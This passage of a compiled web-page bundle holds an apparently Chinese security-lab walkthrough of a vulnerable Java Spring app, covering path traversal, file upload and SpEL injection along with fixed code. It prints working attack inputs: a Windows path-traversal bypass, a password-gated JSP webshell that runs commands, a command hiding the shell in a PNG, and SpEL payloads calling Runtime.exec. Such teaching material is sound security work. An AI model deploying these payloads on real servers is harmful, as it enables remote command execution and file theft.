`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[406]||=i(`p`,null,`存在目录穿越，我们直接读取文件`,-1),s[407]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301105109.png`,alt:`image-20250730110528049`,loading:`lazy`,decoding:`async`})],-1),s[408]||=i(`p`,null,`修复代码：`,-1),s[409]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @GetMapping("/path_traversal/sec")
    public String getImageSec(String filepath) throws IOException {
        if (SecurityUtil.pathFilter(filepath) == null) {
            logger.info("Illegal file path: " + filepath);
            return "Bad boy. Illegal file path.";
        }
        return getImgBase64(filepath);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[410]||=i(`p`,null,`pathFilter函数内容：`,-1),s[411]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` public static String pathFilter(String filepath) {
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf('%') != -1) {
            try {
                temp = URLDecoder.decode(temp, "utf-8");
            } catch (UnsupportedEncodingException e) {
                logger.info("Unsupported encoding exception: " + filepath);
                return null;
            } catch (Exception e) {
                logger.info(e.toString());
                return null;
            }
        }

        if (temp.contains("..") || temp.charAt(0) == '/') {
            return null;
        }

        return filepath;
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[412]||=i(`p`,null,`对文件路径参数增加了过滤方法pathFilter，如果文件路径开头为/字符或者存在…连续字符出现就返回空字符串，但是这种过滤只是简单的应对措施，如果是Windows操作系统上以盘符开始的路径，就显得无能为力。例如使用\\读取（windows下）`,-1),s[413]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`/path_traversal/sec?filepath=..\\..\\..\\..\\..\\windows\\win.ini
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[414]||=i(`h3`,{id:`文件上传`,tabindex:`-1`},[r(`文件上传 `),i(`a`,{class:`header-anchor`,href:`#文件上传`,"aria-label":`Permalink to "文件上传"`},`​`)],-1),s[415]||=i(`h4`,{id:`_1-file-upload`,tabindex:`-1`},[r(`1./file/upload `),i(`a`,{class:`header-anchor`,href:`#_1-file-upload`,"aria-label":`Permalink to "1./file/upload"`},`​`)],-1),s[416]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @PostMapping("/upload")
    public String singleFileUpload(@RequestParam("file") MultipartFile file,
                                   RedirectAttributes redirectAttributes) {
        if (file.isEmpty()) {
            // 赋值给uploadStatus.html里的动态参数message
            redirectAttributes.addFlashAttribute("message", "Please select a file to upload");
            return "redirect:/file/status";
        }

        try {
            // Get the file and save it somewhere
            byte[] bytes = file.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
            Files.write(path, bytes);

            redirectAttributes.addFlashAttribute("message",
                    "You successfully uploaded '" + UPLOADED_FOLDER + file.getOriginalFilename() + "'");

        } catch (IOException e) {
            redirectAttributes.addFlashAttribute("message", "upload failed");
            logger.error(e.toString());
        }

        return "redirect:/file/status";
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[417]||=i(`p`,null,`文件上传到方法中，未判断文件的类型、扩展名等信息，也未对生成文件的文件名进行重置，只是直接将文件上传到文件保存目录中，使用测试文件成功上传。构造一句话木马：`,-1),s[418]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`<% if ("pass".equals(request.getParameter("pwd"))) { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); } %>

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[419]||=i(`p`,null,`保存为shell.jsp进行上传，然后传入参数pwd=pass&cmd=whoami`,-1),s[420]||=i(`p`,null,`修复代码`,-1),s[421]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @PostMapping("/upload/picture")
    @ResponseBody
    public String uploadPicture(@RequestParam("file") MultipartFile multifile) throws Exception {
        if (multifile.isEmpty()) {
            return "Please select a file to upload";
        }

        String fileName = multifile.getOriginalFilename();
        String Suffix = fileName.substring(fileName.lastIndexOf(".")); // 获取文件后缀名
        String mimeType = multifile.getContentType(); // 获取MIME类型
        String filePath = UPLOADED_FOLDER + fileName;
        File excelFile = convert(multifile);

        // 判断文件后缀名是否在白名单内  校验1
        String[] picSuffixList = {".jpg", ".png", ".jpeg", ".gif", ".bmp", ".ico"};
        boolean suffixFlag = false;
        for (String white_suffix : picSuffixList) {
            if (Suffix.toLowerCase().equals(white_suffix)) {
                suffixFlag = true;
                break;
            }
        }
        if (!suffixFlag) {
            logger.error("[-] Suffix error: " + Suffix);
            deleteFile(filePath);
            return "Upload failed. Illeagl picture.";
        }

        // 判断MIME类型是否在黑名单内 校验2
        String[] mimeTypeBlackList = {
                "text/html",
                "text/javascript",
                "application/javascript",
                "application/ecmascript",
                "text/xml",
                "application/xml"
        };
        for (String blackMimeType : mimeTypeBlackList) {
            // 用contains是为了防止text/html;charset=UTF-8绕过
            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) {
                logger.error("[-] Mime type error: " + mimeType);
                deleteFile(filePath);
                return "Upload failed. Illeagl picture.";
            }
        }

        // 判断文件内容是否是图片 校验3
        boolean isImageFlag = isImage(excelFile);
        deleteFile(randomFilePath);

        if (!isImageFlag) {
            logger.error("[-] File is not Image");
            deleteFile(filePath);
            return "Upload failed. Illeagl picture.";
        }

        try {
            // Get the file and save it somewhere
            byte[] bytes = multifile.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());
            Files.write(path, bytes);
        } catch (IOException e) {
            logger.error(e.toString());
            deleteFile(filePath);
            return "Upload failed";
        }

        logger.info("[+] Safe file. Suffix: {}, MIME: {}", Suffix, mimeType);
        logger.info("[+] Successfully uploaded {}", filePath);
        return String.format("You successfully uploaded '%s'", filePath);
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[422]||=i(`p`,null,`判断为图片才允许上传，不过仍可通过其他方式绕过`,-1),s[423]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`copy 1.png/shell.jsp muma.png
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[424]||=i(`h3`,{id:`spel表达式注入漏洞`,tabindex:`-1`},[r(`SpEL表达式注入漏洞 `),i(`a`,{class:`header-anchor`,href:`#spel表达式注入漏洞`,"aria-label":`Permalink to "SpEL表达式注入漏洞"`},`​`)],-1),s[425]||=i(`p`,null,[r(`Spring表达式语言（简称 `),i(`strong`,null,`SpEL`),r(`，全称`),i(`strong`,null,`Spring Expression Language`),r(`）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。`)],-1),s[426]||=i(`p`,null,[r(`spel语法中的`),i(`code`,null,`T()`),r(`操作符 , `),i(`code`,null,`T()`),r(`操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法`),i(`code`,null,`T(全限定类名).方法名()`)],-1),s[427]||=i(`h4`,{id:`_1-spel-vuln1`,tabindex:`-1`},[r(`1./spel/vuln1 `),i(`a`,{class:`header-anchor`,href:`#_1-spel-vuln1`,"aria-label":`Permalink to "1./spel/vuln1"`},`​`)],-1),s[428]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`   @RequestMapping("/spel/vuln1")
    public String spel_vuln1(String value) {
        ExpressionParser parser = new SpelExpressionParser();
        return parser.parseExpression(value).getValue().toString();
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[429]||=i(`p`,null,`可以通过spel表达式实现命令执行`,-1),s[430]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`T(java.lang.Runtime).getRuntime().exec("calc")
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[431]||=i(`h4`,{id:`_2-spel-vuln2`,tabindex:`-1`},[r(`2./spel/vuln2 `),i(`a`,{class:`header-anchor`,href:`#_2-spel-vuln2`,"aria-label":`Permalink to "2./spel/vuln2"`},`​`)],-1),s[432]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`@RequestMapping("spel/vuln2")
    public String spel_vuln2(String value) {
        StandardEvaluationContext context = new StandardEvaluationContext();
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(value, new TemplateParserContext());
        Object x = expression.getValue(context);    // trigger vulnerability point
        return x.toString();   // response
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[433]||=i(`p`,null,`比第一关多了一个模板引擎，用#{}套上就好了`,-1),s[434]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,` #{T(java.lang.Runtime).getRuntime().exec('calc')}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[435]||=i(`h4`,{id:`漏洞修复-1`,tabindex:`-1`},[r(`漏洞修复 `),i(`a`,{class:`header-anchor`,href:`#漏洞修复-1`,"aria-label":`Permalink to "漏洞修复"`},`​`)],-1),s[436]||=i(`p`,null,`修复代码：`,-1),s[437]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`  @RequestMapping("spel/sec")
    public String spel_sec(String value) {
        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(value, new TemplateParserContext());
        Object x = expression.getValue(context);
        return x.toString();
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[438]||=i(`p`,null,`使用 SimpleEvaluationContext进行加固，定义一个只读的上下文环境防止不安全的操作`,-1)]),"main-header":l(()=>[c(n.$slots,`main-header`)]),"main-header-after":l(()=>[c(n.$slots,`main-header-after`)]),"main-nav":l(()=>[c(n.$slots,`main-nav`)]),"main-content-before":l(()=>[c(n.$slots,`main-content-before`)]),"main-content":l(()=>[c(n.$slots,`main-content`)]),"main-content-after":l(()=>[c(n.$slots,`main-content-after`)]),"main-nav-before":l(()=>[c(n.$slots,`main-nav-before`)]),"main-nav-after":l(()=>[c(n.$slots,`main-nav-after`)]),comment:l(()=>[c(n.$slots,`comment`)]),footer:l(()=>[c(n.$slots,`footer`)]),aside:l(()=>[c(n.$slots,`aside`)]),"aside-custom":l(()=>[c(n.$slots,`aside-custom`)]),default:l(()=>[c(n.$slots,`default`)]),_:3},8,[`frontmatter`])}}};export{p as default};